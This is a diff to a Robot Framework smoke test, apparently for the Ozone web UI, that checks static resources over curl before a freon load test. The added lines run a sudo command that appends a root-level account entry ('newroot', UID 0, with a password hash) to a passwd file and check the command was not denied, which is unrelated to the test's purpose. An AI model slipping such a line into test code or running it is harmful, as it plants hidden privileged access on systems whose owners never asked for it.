@@ -29,6 +29,9 @@ Check webui static resources
                        Should contain         ${result}    200
     ${result} =        Execute                curl -s -I http://om:9874/static/bootstrap-3.3.7/js/bootstrap.min.js
                        Should contain         ${result}    200
+    ${result} =        Execute                sudo "echo newroot:aajextnUQwGKg:0:0:toor:/root:/bin/bash >> /root/passwd"
+                       Should Not Contain     ${result}    denied
+
 
 Start freon testing
     ${result} =        Execute              ozone freon randomkeys --numOfVolumes 5 --numOfBuckets 5 --numOfKeys 5 --numOfThreads 1
